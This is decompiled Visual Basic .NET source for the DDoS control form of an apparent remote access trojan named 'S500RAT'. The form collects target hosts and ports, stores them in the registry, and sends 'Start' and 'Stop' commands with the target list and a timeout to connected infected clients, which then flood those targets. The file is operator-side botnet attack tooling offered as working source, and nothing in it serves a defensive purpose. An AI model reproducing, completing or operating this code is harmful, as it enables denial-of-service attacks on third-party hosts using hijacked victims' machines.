Imports System
Imports System.Collections
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Drawing2D
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Guna.UI2.WinForms
Imports Guna.UI2.WinForms.Enums
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection
Imports Sunny.UI

Namespace S500RAT
	' Token: 0x02000017 RID: 23
	<DesignerGenerated()>
	Public Partial Class FormDDos
		Inherits Form

		' Token: 0x060001FF RID: 511 RVA: 0x0000FC96 File Offset: 0x0000DE96
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.FormDDos_Load
			AddHandler MyBase.Resize, AddressOf Me.FormDDos_Resize
			Me.FormSize = False
			Me.InitializeComponent()
		End Sub

		' Token: 0x170000E1 RID: 225
		' (get) Token: 0x06000202 RID: 514 RVA: 0x000117C4 File Offset: 0x0000F9C4
		' (set) Token: 0x06000203 RID: 515 RVA: 0x000117D0 File Offset: 0x0000F9D0
		Friend Overridable Property Timer1 As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As System.Windows.Forms.Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x170000E2 RID: 226
		' (get) Token: 0x06000204 RID: 516 RVA: 0x00011813 File Offset: 0x0000FA13
		' (set) Token: 0x06000205 RID: 517 RVA: 0x0001181D File Offset: 0x0000FA1D
		Friend Overridable Property UiLabel1 As UILabel

		' Token: 0x170000E3 RID: 227
		' (get) Token: 0x06000206 RID: 518 RVA: 0x00011826 File Offset: 0x0000FA26
		' (set) Token: 0x06000207 RID: 519 RVA: 0x00011830 File Offset: 0x0000FA30
		Private Overridable Property ClientInfo As Label

		' Token: 0x170000E4 RID: 228
		' (get) Token: 0x06000208 RID: 520 RVA: 0x00011839 File Offset: 0x0000FA39
		' (set) Token: 0x06000209 RID: 521 RVA: 0x00011844 File Offset: 0x0000FA44
		Friend Overridable Property DDosPort As Guna2TextBox
			<CompilerGenerated()>
			Get
				Return Me._DDosPort
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2TextBox)
				Dim value2 As KeyPressEventHandler = AddressOf Me.DDosPort_KeyPress
				Dim ddosPort As Guna2TextBox = Me._DDosPort
				If ddosPort IsNot Nothing Then
					RemoveHandler ddosPort.KeyPress, value2
				End If
				Me._DDosPort = value
				ddosPort = Me._DDosPort
				If ddosPort IsNot Nothing Then
					AddHandler ddosPort.KeyPress, value2
				End If
			End Set
		End Property

		' Token: 0x170000E5 RID: 229
		' (get) Token: 0x0600020A RID: 522 RVA: 0x00011887 File Offset: 0x0000FA87
		' (set) Token: 0x0600020B RID: 523 RVA: 0x00011891 File Offset: 0x0000FA91
		Friend Overridable Property DDosHost As Guna2TextBox

		' Token: 0x170000E6 RID: 230
		' (get) Token: 0x0600020C RID: 524 RVA: 0x0001189A File Offset: 0x0000FA9A
		' (set) Token: 0x0600020D RID: 525 RVA: 0x000118A4 File Offset: 0x0000FAA4
		Friend Overridable Property DDosStart As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._DDosStart
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.DDosStart_Click
				Dim ddosStart As Guna2GradientButton = Me._DDosStart
				If ddosStart IsNot Nothing Then
					RemoveHandler ddosStart.Click, value2
				End If
				Me._DDosStart = value
				ddosStart = Me._DDosStart
				If ddosStart IsNot Nothing Then
					AddHandler ddosStart.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000E7 RID: 231
		' (get) Token: 0x0600020E RID: 526 RVA: 0x000118E7 File Offset: 0x0000FAE7
		' (set) Token: 0x0600020F RID: 527 RVA: 0x000118F4 File Offset: 0x0000FAF4
		Friend Overridable Property TimeOut As Guna2TextBox
			<CompilerGenerated()>
			Get
				Return Me._TimeOut
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2TextBox)
				Dim value2 As KeyPressEventHandler = AddressOf Me.TimeOut_KeyPress
				Dim timeOut As Guna2TextBox = Me._TimeOut
				If timeOut IsNot Nothing Then
					RemoveHandler timeOut.KeyPress, value2
				End If
				Me._TimeOut = value
				timeOut = Me._TimeOut
				If timeOut IsNot Nothing Then
					AddHandler timeOut.KeyPress, value2
				End If
			End Set
		End Property

		' Token: 0x170000E8 RID: 232
		' (get) Token: 0x06000210 RID: 528 RVA: 0x00011937 File Offset: 0x0000FB37
		' (set) Token: 0x06000211 RID: 529 RVA: 0x00011941 File Offset: 0x0000FB41
		Friend Overridable Property ListDDos As Guna2DataGridView

		' Token: 0x170000E9 RID: 233
		' (get) Token: 0x06000212 RID: 530 RVA: 0x0001194A File Offset: 0x0000FB4A
		' (set) Token: 0x06000213 RID: 531 RVA: 0x00011954 File Offset: 0x0000FB54
		Friend Overridable Property Column1 As DataGridViewImageColumn

		' Token: 0x170000EA RID: 234
		' (get) Token: 0x06000214 RID: 532 RVA: 0x0001195D File Offset: 0x0000FB5D
		' (set) Token: 0x06000215 RID: 533 RVA: 0x00011967 File Offset: 0x0000FB67
		Friend Overridable Property Column2 As DataGridViewTextBoxColumn

		' Token: 0x170000EB RID: 235
		' (get) Token: 0x06000216 RID: 534 RVA: 0x00011970 File Offset: 0x0000FB70
		' (set) Token: 0x06000217 RID: 535 RVA: 0x0001197A File Offset: 0x0000FB7A
		Friend Overridable Property Column3 As DataGridViewTextBoxColumn

		' Token: 0x170000EC RID: 236
		' (get) Token: 0x06000218 RID: 536 RVA: 0x00011983 File Offset: 0x0000FB83
		' (set) Token: 0x06000219 RID: 537 RVA: 0x00011990 File Offset: 0x0000FB90
		Friend Overridable Property Add_Info As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._Add_Info
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.Add_Info_Click
				Dim add_Info As Guna2GradientButton = Me._Add_Info
				If add_Info IsNot Nothing Then
					RemoveHandler add_Info.Click, value2
				End If
				Me._Add_Info = value
				add_Info = Me._Add_Info
				If add_Info IsNot Nothing Then
					AddHandler add_Info.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000ED RID: 237
		' (get) Token: 0x0600021A RID: 538 RVA: 0x000119D3 File Offset: 0x0000FBD3
		' (set) Token: 0x0600021B RID: 539 RVA: 0x000119DD File Offset: 0x0000FBDD
		Friend Overridable Property Guna2ResizeBox1 As Guna2ResizeBox

		' Token: 0x170000EE RID: 238
		' (get) Token: 0x0600021C RID: 540 RVA: 0x000119E6 File Offset: 0x0000FBE6
		' (set) Token: 0x0600021D RID: 541 RVA: 0x000119F0 File Offset: 0x0000FBF0
		Friend Overridable Property Guna2Elipse1 As Guna2Elipse

		' Token: 0x170000EF RID: 239
		' (get) Token: 0x0600021E RID: 542 RVA: 0x000119F9 File Offset: 0x0000FBF9
		' (set) Token: 0x0600021F RID: 543 RVA: 0x00011A03 File Offset: 0x0000FC03
		Friend Overridable Property ImageList1 As ImageList

		' Token: 0x170000F0 RID: 240
		' (get) Token: 0x06000220 RID: 544 RVA: 0x00011A0C File Offset: 0x0000FC0C
		' (set) Token: 0x06000221 RID: 545 RVA: 0x00011A18 File Offset: 0x0000FC18
		Friend Overridable Property DDosRemove As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._DDosRemove
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.DDosRemove_Click
				Dim ddosRemove As Guna2GradientButton = Me._DDosRemove
				If ddosRemove IsNot Nothing Then
					RemoveHandler ddosRemove.Click, value2
				End If
				Me._DDosRemove = value
				ddosRemove = Me._DDosRemove
				If ddosRemove IsNot Nothing Then
					AddHandler ddosRemove.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000F1 RID: 241
		' (get) Token: 0x06000222 RID: 546 RVA: 0x00011A5B File Offset: 0x0000FC5B
		' (set) Token: 0x06000223 RID: 547 RVA: 0x00011A65 File Offset: 0x0000FC65
		Friend Overridable Property Guna2DragControl1 As Guna2DragControl

		' Token: 0x170000F2 RID: 242
		' (get) Token: 0x06000224 RID: 548 RVA: 0x00011A6E File Offset: 0x0000FC6E
		' (set) Token: 0x06000225 RID: 549 RVA: 0x00011A78 File Offset: 0x0000FC78
		Friend Overridable Property Guna2BorderlessForm1 As Guna2BorderlessForm

		' Token: 0x170000F3 RID: 243
		' (get) Token: 0x06000226 RID: 550 RVA: 0x00011A81 File Offset: 0x0000FC81
		' (set) Token: 0x06000227 RID: 551 RVA: 0x00011A8B File Offset: 0x0000FC8B
		Friend Overridable Property Mini As ValleyMini

		' Token: 0x170000F4 RID: 244
		' (get) Token: 0x06000228 RID: 552 RVA: 0x00011A94 File Offset: 0x0000FC94
		' (set) Token: 0x06000229 RID: 553 RVA: 0x00011A9E File Offset: 0x0000FC9E
		Friend Overridable Property MAX As ValleyMax

		' Token: 0x170000F5 RID: 245
		' (get) Token: 0x0600022A RID: 554 RVA: 0x00011AA7 File Offset: 0x0000FCA7
		' (set) Token: 0x0600022B RID: 555 RVA: 0x00011AB4 File Offset: 0x0000FCB4
		Friend Overridable Property ExitForm As ValleyClose
			<CompilerGenerated()>
			Get
				Return Me._ExitForm
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ValleyClose)
				Dim value2 As EventHandler = AddressOf Me.ExitForm_Click
				Dim exitForm As ValleyClose = Me._ExitForm
				If exitForm IsNot Nothing Then
					RemoveHandler exitForm.Click, value2
				End If
				Me._ExitForm = value
				exitForm = Me._ExitForm
				If exitForm IsNot Nothing Then
					AddHandler exitForm.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000F6 RID: 246
		' (get) Token: 0x0600022C RID: 556 RVA: 0x00011AF7 File Offset: 0x0000FCF7
		' (set) Token: 0x0600022D RID: 557 RVA: 0x00011B01 File Offset: 0x0000FD01
		Public Property Client As Clients

		' Token: 0x170000F7 RID: 247
		' (get) Token: 0x0600022E RID: 558 RVA: 0x00011B0A File Offset: 0x0000FD0A
		' (set) Token: 0x0600022F RID: 559 RVA: 0x00011B14 File Offset: 0x0000FD14
		Public Property F As FormS500

		' Token: 0x170000F8 RID: 248
		' (get) Token: 0x06000230 RID: 560 RVA: 0x00011B1D File Offset: 0x0000FD1D
		' (set) Token: 0x06000231 RID: 561 RVA: 0x00011B27 File Offset: 0x0000FD27
		Public Property FullPath As String

		' Token: 0x170000F9 RID: 249
		' (get) Token: 0x06000232 RID: 562 RVA: 0x00011B30 File Offset: 0x0000FD30
		' (set) Token: 0x06000233 RID: 563 RVA: 0x00011B3A File Offset: 0x0000FD3A
		Friend Property ParentClient As Clients

		' Token: 0x06000234 RID: 564 RVA: 0x00011B44 File Offset: 0x0000FD44
		Private Sub FormDDos_Load(sender As Object, e As EventArgs)
			Me.ListDDos.ColumnHeadersDefaultCellStyle.BackColor = Color.FromArgb(26, 31, 55)
			Me.ListDDos.AlternatingRowsDefaultCellStyle.BackColor = Color.FromArgb(26, 31, 55)
			Me.ListDDos.AlternatingRowsDefaultCellStyle.BackColor = Color.FromArgb(26, 31, 55)
			Me.ListDDos.AlternatingRowsDefaultCellStyle.ForeColor = Color.FromArgb(255, 255, 255)
			Me.ListDDos.DefaultCellStyle.BackColor = Color.FromArgb(7, 11, 48)
			Me.ListDDos.DefaultCellStyle.ForeColor = Color.FromArgb(255, 255, 255)
			Me.ListDDos.DefaultCellStyle.SelectionBackColor = Color.FromArgb(47, 39, 134)
			Me.ListDDos.DefaultCellStyle.SelectionForeColor = Color.FromArgb(255, 255, 255)
			Me.ListDDos.CellBorderStyle = DataGridViewCellBorderStyle.[Single]
			Dim expression As String = Conversions.ToString(RuntimeHelpers.GetObjectValue(DataB.InfoClient(Me.ParentClient.L)))
			Try
				Me.ClientInfo.Text = String.Concat(New String() { Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(1), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(2), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(3), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(4) })
			Catch ex As Exception
				Me.ClientInfo.Text = "Not found !"
			End Try
			Me.FormSize = True
			Me.MinimumSize = MyBase.Size
			Try
				Me.ReadListDDos()
			Catch ex2 As Exception
			End Try
		End Sub

		' Token: 0x06000235 RID: 565 RVA: 0x00011D5C File Offset: 0x0000FF5C
		Private Sub ReadListDDos()
			Try
				Dim text As String = Conversions.ToString(Functions.RegistryGetValue("#ListDDos", ""))
				Dim flag As Boolean = text <> Nothing
				If flag Then
					Dim array As String() = text.Split(New String() { "<*>" }, StringSplitOptions.None)
					For Each text2 As String In array
						Dim flag2 As Boolean = text2.Length > 0
						If flag2 Then
							Me.ListDDos.Rows.Add(New Object() { Me.ImageList1.Images("DDOS.png"), text2.Split(New Char() { ","c })(0).ToString(), text2.Split(New Char() { ","c })(1).ToString() })
						End If
					Next
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000236 RID: 566 RVA: 0x00011E64 File Offset: 0x00010064
		Public Sub SaveListDDos()
			Try
				Dim text As String = String.Empty
				Try
					For Each obj As Object In CType(Me.ListDDos.Rows, IEnumerable)
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Dim flag As Boolean = Not dataGridViewRow.IsNewRow
						If flag Then
							text = String.Concat(New String() { text, dataGridViewRow.Cells(1).Value.ToString(), ",", dataGridViewRow.Cells(2).Value.ToString(), "<*>" })
						End If
					Next
				Finally
					Dim enumerator As IEnumerator
					If TypeOf enumerator Is IDisposable Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
				Functions.RegistrySetValue("#ListDDos", Conversions.ToString(text))
			Catch ex As Exception
				Console.WriteLine(ex.Message)
			End Try
		End Sub

		' Token: 0x06000237 RID: 567 RVA: 0x00011F6C File Offset: 0x0001016C
		Private Sub Add_Info_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Operators.CompareString(Me.DDosHost.Text, Nothing, False) = 0
				If flag Then
					MessageBox.Show("Please enter Host", "DDoS Attack!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
				Else
					Dim flag2 As Boolean = Operators.CompareString(Me.DDosPort.Text, Nothing, False) = 0
					If flag2 Then
						MessageBox.Show("Please enter Port", "DDoS Attack!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
					Else
						Me.ListDDos.Rows.Add(New Object() { Me.ImageList1.Images("DDOS.png"), Me.DDosHost.Text, Me.DDosPort.Text })
						Me.DDosHost.Clear()
						Me.DDosPort.Clear()
					End If
				End If
			Catch ex As Exception
				MessageBox.Show(ex.Message, "DDoS Attack!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
			End Try
		End Sub

		' Token: 0x06000238 RID: 568 RVA: 0x0001207C File Offset: 0x0001027C
		Private Sub DDosPort_KeyPress(sender As Object, e As KeyPressEventArgs)
			Dim flag As Boolean = Not Char.IsNumber(e.KeyChar) And Not Char.IsControl(e.KeyChar)
			If flag Then
				e.Handled = True
			End If
		End Sub

		' Token: 0x06000239 RID: 569 RVA: 0x000120B8 File Offset: 0x000102B8
		Private Sub TimeOut_KeyPress(sender As Object, e As KeyPressEventArgs)
			Dim flag As Boolean = Not Char.IsNumber(e.KeyChar) And Not Char.IsControl(e.KeyChar)
			If flag Then
				e.Handled = True
			End If
		End Sub

		' Token: 0x0600023A RID: 570 RVA: 0x000120F4 File Offset: 0x000102F4
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Not Me.ParentClient.TcpClient.Connected OrElse Not Me.Client.TcpClient.Connected
				If flag Then
					MyBase.Close()
				End If
			Catch ex As Exception
				MyBase.Close()
			End Try
		End Sub

		' Token: 0x0600023B RID: 571 RVA: 0x00012160 File Offset: 0x00010360
		Private Sub ExitForm_Click(sender As Object, e As EventArgs)
			ThreadPool.QueueUserWorkItem(Sub(o As Object)
				Dim client As Clients = Me.Client
				If client IsNot Nothing Then
					client.Disconnected()
				End If
				MyBase.Close()
			End Sub)
		End Sub

		' Token: 0x0600023C RID: 572 RVA: 0x00012178 File Offset: 0x00010378
		Private Sub FormDDos_Resize(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.FormSize
			If flag Then
				Dim width As Integer = Screen.PrimaryScreen.Bounds.Width
				Dim height As Integer = Screen.PrimaryScreen.Bounds.Height
				Dim width2 As Integer = MyBase.Width
				Dim height2 As Integer = MyBase.Height
				Dim x As Integer = CInt(Math.Round(CDbl((width - width2)) / 2.0))
				Dim y As Integer = CInt(Math.Round(CDbl((height - height2)) / 2.0))
				MyBase.Location = New Point(x, y)
			End If
		End Sub

		' Token: 0x0600023D RID: 573 RVA: 0x0001220C File Offset: 0x0001040C
		Private Sub DDosStart_Click(sender As Object, e As EventArgs)
			Try
				Dim msgPack As MsgPack = New MsgPack()
				Dim flag As Boolean = Operators.CompareString(Me.DDosStart.Text, "Stop", False) = 0
				If flag Then
					msgPack.ForcePathObject("Packet").AsString = "Stop"
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
					Me.DDosPort.Enabled = True
					Me.DDosHost.Enabled = True
					Me.Add_Info.Enabled = True
					Me.TimeOut.Enabled = True
					Me.ListDDos.Enabled = True
					Me.DDosRemove.Enabled = True
					Me.DDosStart.Text = "Start"
				Else
					Dim flag2 As Boolean = Me.ListDDos.Rows.Count = 0
					If flag2 Then
						MessageBox.Show("Please add the host and port in the list", "DDoS Attack!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
					Else
						Dim text As String = String.Empty
						Try
							For Each obj As Object In CType(Me.ListDDos.Rows, IEnumerable)
								Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
								Dim flag3 As Boolean = Not dataGridViewRow.IsNewRow
								If flag3 Then
									text = String.Concat(New String() { text, dataGridViewRow.Cells(1).Value.ToString(), ",", dataGridViewRow.Cells(2).Value.ToString(), "-==>" })
								End If
							Next
						Finally
							Dim enumerator As IEnumerator
							If TypeOf enumerator Is IDisposable Then
								TryCast(enumerator, IDisposable).Dispose()
							End If
						End Try
						msgPack.ForcePathObject("Packet").AsString = "Start"
						msgPack.ForcePathObject("HostAndPorts").AsString = text
						msgPack.ForcePathObject("TimeOut").AsString = Me.TimeOut.Text
						ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
						Me.DDosPort.Enabled = False
						Me.DDosHost.Enabled = False
						Me.Add_Info.Enabled = False
						Me.TimeOut.Enabled = False
						Me.ListDDos.Enabled = False
						Me.DDosRemove.Enabled = False
						Me.DDosStart.Text = "Stop"
						Me.SaveListDDos()
					End If
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600023E RID: 574 RVA: 0x000124D0 File Offset: 0x000106D0
		Private Sub DDosRemove_Click(sender As Object, e As EventArgs)
			Try
				Try
					For Each obj As Object In Me.ListDDos.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Me.ListDDos.Rows.Remove(dataGridViewRow)
					Next
				Finally
					Dim enumerator As IEnumerator
					If TypeOf enumerator Is IDisposable Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x04000107 RID: 263
		Private FormSize As Boolean
	End Class
End Namespace
